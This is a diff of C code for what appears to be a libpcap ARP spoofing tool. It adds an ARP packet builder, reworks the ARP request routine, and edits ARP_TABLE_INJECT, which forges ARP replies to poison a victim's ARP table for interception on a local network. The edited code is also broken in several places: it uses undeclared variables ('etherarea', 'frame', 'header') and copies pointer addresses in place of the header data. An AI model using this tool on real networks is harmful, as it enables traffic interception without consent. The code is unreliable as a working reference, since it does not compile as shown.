@@ -1,35 +1,13 @@
 #include "my_pcap.h"
 
-char *allocate_strmem(int len){
-	void *tmp;
-	tmp = (char *)malloc(len*sizeof(char));
-	if (tmp != NULL){
-		memset(tmp, 0, len*sizeof(char));
-		return tmp;
-	}
-	else{
-		fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_strmem().\n");
-		exit(1);
-	}
-}
+struct addr{
+    uint8_t mac[6];
+    uint8_t ip[4];
+};
 
-uint8_t *allocate_ustrmem (int len){
-	void *tmp;
-	tmp = (uint8_t *)malloc(len*sizeof(uint8_t));
-	if (tmp != NULL){
-		memset(tmp, 0, len*sizeof(uint8_t));
-		return tmp;
-	}
-	else{
-		fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
-		exit(1);
-	}
-}
-
-
-void GET_MYMAC(uint8_t *mac, char *interface) {
+void GET_MYMACIP(struct addr *addr, char *interface) {
 	int sd,i=0;
-	struct ifreq ifr;
+	struct ifreq ifr;	// ethernet structure
 
 	if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
     	perror ("socket() failed to get socket descriptor for using ioctl() ");
@@ -38,46 +16,85 @@ void GET_MYMAC(uint8_t *mac, char *interface) {
 
   	// Use ioctl() to look up interface name and get its MAC address.
   	memset (&ifr, 0, sizeof (ifr));
-  	snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
+  	strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
+
   	if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
    	 	perror ("ioctl() failed to get source MAC address ");
-   		return (-1);
+   		return ;
   	}
-	close (sd);
 
-	// Copy source MAC address.
-  	memcpy (mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+	// Copy source MAC & IP address.
+  	memcpy (addr->mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+	memcpy (addr->ip, &(((struct sockaddr_in* ) &ifr.ifr_addr)->sin_addr),4 * sizeof (uint8_t));
 
     // Report source MAC address to stdout.
-  	printf ("MAC address for interface %s is ", interface);
-  	for (i=0; i<5; i++) {
-    	printf ("%02x:", mac[i]);
- 	}
-	printf("%02x\n",mac[5]);
-}
-void GET_MYIP(u_int8_t *ip_addr, char *interface) {
-	int fd;
-	struct ifreq ifr;
+  	printf ("My MAC address for interface %s is ", interface);
+  	for (i=0; i<5; i++) printf ("%02x:", addr->mac[i]);
+	printf("%02x\n", addr->mac[5]);
 
-	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	ifr.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
-	ioctl(fd, SIOCGIFADDR, &ifr);
-	/* and more importantly */
-	printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-	memcpy(ip_addr, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IP_ADDR_LEN);
-    
-	close(fd);
+	// Report source IP address to stdout.
+  	printf ("My IP address for interface %s is ", interface);
+	for (i=0; i<3; i++) printf("%d.", addr->ip[i]);
+	printf("%d\n", addr->ip[3]);
+
+	close(sd);
 
 }
 
-u_char* ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struct in_addr *targetIP) {
+void gen_arp_packet(uint8_t *packet, uint8_t *sourcemac, uint8_t *destmac, uint8_t *sourceip, uint8_t *destip, u_int16_t opcode ) {
+	struct ether_header *etharea;
+	struct arp_hdr_ *arparea;
+
+	etharea = (struct ether_header *)malloc(sizeof(struct ether_header));
+	arparea = (struct arp_hdr_ *)malloc(sizeof(struct arp_hdr_));
+
+	// ether layer
+	if(destmac != NULL)
+		memcpy(etharea->ether_dhost, destmac, ETHER_ADDR_LEN);
+	else
+		memcpy(etharea->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
+	memcpy(etharea->ether_shost, sourcemac, ETHER_ADDR_LEN);
+	etharea->ether_type = htons(ETHERTYPE_ARP);
+
+	// arp layer
+	arparea->htype = htons(ARPHRD_ETHER);
+	arparea->ptype = htons(ETHERTYPE_IP);
+	arparea->hlen = 6;
+	arparea->plen = 4;
+	arparea->opcode = htons(opcode);
+	memcpy(arparea->sender_mac, sourcemac, ETHER_ADDR_LEN);
+	memcpy(arparea->sender_ip, sourceip, IP_ADDR_LEN);	
+
+	if(destmac != NULL)
+		memcpy(arparea->target_mac, destmac, ETHER_ADDR_LEN);
+	else
+		memcpy(arparea->target_mac, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
+	memcpy(arparea->target_ip, destip, IP_ADDR_LEN);
+	
+	memset(packet, '\x00', sizeof(struct ether_header) + sizeof(struct arp_hdr_));   // 0 initialize
+	memcpy(packet, &etherarea, sizeof(struct ether_header));                // ether first!
+	memcpy(packet + sizeof(struct ether_header), &arparea, sizeof(struct arp_hdr_));   // arp next!
+
+}
+
+void pcap_send_check(pcap_t* handle, uint8_t *packet) {
+	if(pcap_sendpacket(handle,packet,sizeof(struct ether_header)+sizeof(struct arp_hdr_))==-1) {
+    	free(packet);
+        pcap_perror(handle,0);
+        pcap_close(handle);
+        exit(1);
+    }
+}
+
+
+// in main it will return sender_mac
+// sender_mac = ARP_REQUEST(pcd, my_mac, my_ip, &senderIP); 
+void ARP_REQUEST(pcap_t *handle, struct addr* sender, struct addr *target) {
 	u_char* packet;
 	u_char* recv_packet;
 	struct ether_header etherHdr, *recv_ether; // <netinet/ether.h>
-	struct arp_hdr_ arp_h, *recv_arp;
+	struct arp_hdr_ arp_h, *recv_arp;	// "my_pcap.h"
 
-	struct pcap_pkthdr *header;
 	int packet_len;
 	int flag, i;
 	struct in_addr recv_IP;
@@ -85,55 +102,52 @@ u_char* ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, 
 	u_char* buf;
 	u_char addr[4];
 	
-	//ether layer
-	memcpy(etherHdr.ether_shost,mac_addr,ETHER_ADDR_LEN); // Ether_SRC == MY_MAC
+	// ether layer / first myaddr => broadcast
+	memcpy(etherHdr.ether_shost,sender->mac,ETHER_ADDR_LEN); // Ether_SRC == MY_MAC
 	memcpy(etherHdr.ether_dhost,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN); // Broadcast
 	etherHdr.ether_type = htons(0x0806); // short! ARP 0x0806
 	
-	// arp layer
+	// arp layer  /  
 	arp_h.htype = htons(0x0001); // Hardware type
 	arp_h.ptype = htons(ETHERTYPE_IP); // Protocol type
 	arp_h.hlen = ETHER_ADDR_LEN; // Hardware size
-	arp_h.plen = 4;				 // Protocol size
+	arp_h.plen = 4;				 // Protocol size : in_addr_t size
 	arp_h.opcode = htons(1);	 // ARP request opcode: 1
-	memcpy(arp_h.sender_mac,mac_addr,sizeof(arp_h.sender_mac));
-	memcpy(arp_h.sender_ip,senderIP,sizeof(arp_h.sender_ip));
+	memcpy(arp_h.sender_mac,sender->mac,sizeof(arp_h.sender_mac));
+	memcpy(arp_h.sender_ip,sender->ip,sizeof(arp_h.sender_ip));
 	memcpy(arp_h.target_mac,"\x00\x00\x00\x00\x00\x00",sizeof(arp_h.target_mac)); //don't know the target mac
-	memcpy(arp_h.target_ip,targetIP,sizeof(arp_h.target_ip));
+	memcpy(arp_h.target_ip,target->ip,sizeof(arp_h.target_ip));
 
 	// packet arrangement!
 	packet = (u_char*) malloc(sizeof(etherHdr)+sizeof(arp_h));
-	memcpy(packet, &etherHdr, sizeof(etherHdr));
-	memcpy(packet + sizeof(etherHdr), &arp_h, sizeof(arp_h));
+	memset(packet, '\x00', sizeof(etherHdr) + sizeof(arp_h));	// 0 initialize
+	memcpy(packet, &etherHdr, sizeof(etherHdr));				// ether first!
+	memcpy(packet + sizeof(etherHdr), &arp_h, sizeof(arp_h));	// arp next!
 	packet_len = sizeof(etherHdr) + sizeof(arp_h);
 	
 	printf("\n[+] packet to send\n");
-	for(i=0; i < sizeof(etherHdr) + sizeof(arp_h); i++){
-		if(i != 0 && i%16 == 0)
+	for(i=0; i < sizeof(etherHdr) + sizeof(arp_h); i++) {
+		if(i != 0 && i % 16 == 0)
 			printf("\n");
 		printf("%02x ", *(packet+i));
 	}
 	printf("end\n");
 	// packet sending!
-	while(1){
-		// int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
-		if(pcap_sendpacket(handle,packet,packet_len) == 0) break;
-	}
+	// int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
+
+	if(pcap_sendpacket(handle,frame,sizeof(struct ether_header)+sizeof(struct arp_hdr_))==-1){
+		free(packet);
+		pcap_perror(handle,0);
+		pcap_close(handle);
+		exit(1);
+	}	
 
 	printf("\n[+] arp request completed!\n\n");
 
 	while(1) {
 		flag = pcap_next_ex(handle,&header,&recv_packet);
-		if(flag == 0) {
-			printf("[-] time out\n");
-			if(pcap_sendpacket(handle,packet,packet_len) !=0){
-				printf("[-] failed! exit!\n");
-				exit(1);
-			}
-			else
-				continue;
-			
-		}
+		if(flag == 0) continue;
+		
 		else if(flag <0) {
 			printf("[-] fail to receive packet");
 			exit(-1);
@@ -146,10 +160,6 @@ u_char* ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, 
 			printf("%02x ", *(recv_packet+i));
 		}
 		recv_ether = (struct ether_header*)recv_packet;
-		if (pcap_datalink(handle) != DLT_EN10MB) {
-			printf("[-] it is not ether\n");
-			exit(1);
-		}
 		
 		recv_arp = (struct arp_hdr_*)(recv_packet + sizeof(struct ether_header));
 		// find if it is arp reply packet
@@ -172,7 +182,7 @@ u_char* ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, 
 		memcpy(&recv_IP,recv_arp->sender_ip,sizeof(recv_IP));
 		printf("\nreply IP : %s\n",inet_ntoa(recv_IP));
 		printf("reply MAC :");
- 	    for (i=0; i<5; i++) {
+		for (i=0; i<5; i++) {
     	    printf("%02x:", recv_arp->sender_mac[i]);
       	}
       	printf("%02x\n",recv_arp->sender_mac[5]);
@@ -205,9 +215,9 @@ void ARP_TABLE_INJECT(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct
 	arp_h.plen = 4;
 	arp_h.opcode = htons(2); // sending reply and rearrange victim's arp table
 
-	memcpy(arp_h.sender_mac,my_mac,sizeof(arp_h.sender_mac));
-	memcpy(arp_h.sender_ip,senderIP,sizeof(arp_h.sender_ip));
-	memcpy(arp_h.target_mac,"\x00\x00\x00\x00\x00\x00",sizeof(arp_h.target_mac));
+	memcpy(arp_h.sender_mac,sender_mac, sizeof(arp_h.sender_mac));
+	memcpy(arp_h.sender_ip,senderIP, sizeof(arp_h.sender_ip));
+	memcpy(arp_h.target_mac,my_mac, sizeof(arp_h.target_mac));
 	memcpy(arp_h.target_ip,targetIP,sizeof(arp_h.target_ip));
 
 	// packet arrangement!
